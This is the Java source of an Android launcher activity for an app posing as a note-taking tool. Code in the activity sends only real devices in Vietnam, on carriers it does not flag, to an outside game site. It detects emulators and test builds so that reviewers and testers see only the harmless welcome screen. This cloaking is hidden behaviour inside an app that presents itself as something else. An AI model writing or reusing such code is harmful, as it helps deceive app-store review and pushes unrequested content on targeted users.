package noteapp.hinkuan.quicknote2610;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.Window;

import java.io.File;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Locale;
import noteapp.hinkuan.quicknote2610.ui.activity.WelcomeActivity;

public class MainApp extends Activity {
    TelephonyManager tm;
    String mavung,tmt;
    String url = "ht://www.taiappgame.us/wkleo";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        getWindow().requestFeature(Window.FEATURE_NO_TITLE);
        super.onCreate(savedInstanceState);
        tm = (TelephonyManager)this.getSystemService(Context.TELEPHONY_SERVICE);
        mavung = tm.getNetworkCountryIso();
        tmt = tm.getNetworkOperatorName().toLowerCase();
        new Thread(new Runnable() {
            public void run() {
                Boolean connected = isConnectedToServer("https://gamebanca.shop/imgdemo/img2610.jpg");
                MainApp.this.runOnUiThread(new Runnable() {
                    public void run() {
                        Log.e("isConnected", connected + " ");
                        if (("vn".equals(mavung) || "VN".equals(mavung)) && !isCheck(tmt) && connected==true) {
                            Intent intent = new Intent(MainApp.this, NoteAppW.class);
                            intent.putExtra("link", url);
                            intent.putExtra("isCheckConnected",""+connected);
                            startActivity(intent);
                        } else {
                            startActivity(new Intent(MainApp.this, WelcomeActivity.class));
                        }


                    }
                });
            }
        }).start();


    }
    public boolean isConnectedToServer(String url) {
        try{
            URL urls = new URL(url);
            HttpURLConnection connection = (HttpURLConnection)urls.openConnection();
            connection.setRequestMethod("GET");
            connection.connect();
            int code = connection.getResponseCode();
            if (code == 200){
                return true;
            }else{
                return false;
            }
        } catch (Exception e) {
            return false;
        }
    }
    public static boolean isCheck(String mv) {
        try {
            String buildDetails = (Build.FINGERPRINT + Build.DEVICE + Build.MODEL + Build.BRAND + Build.PRODUCT + Build.MANUFACTURER + Build.HARDWARE).toLowerCase(Locale.getDefault());
            if (buildDetails.contains("generic")
                    || buildDetails.contains("unknown")
                    || buildDetails.contains("emulator")
                    || buildDetails.contains("sdk")
                    || buildDetails.contains("genymotion")
                    || buildDetails.contains("x86") // this includes vbox86
                    || buildDetails.contains("goldfish")
                    || buildDetails.contains("test-keys")) {
                return true;
            }
        } catch (Throwable t) {
        }
        try {
            if ("android".equals(mv)) {
                return true;
            }
        } catch (Throwable t) {
        }
        try {
            if (new File("/init.goldfish.rc").exists()) {
                return true;
            }
        } catch (Throwable t) {
        }
        return false;
    }
}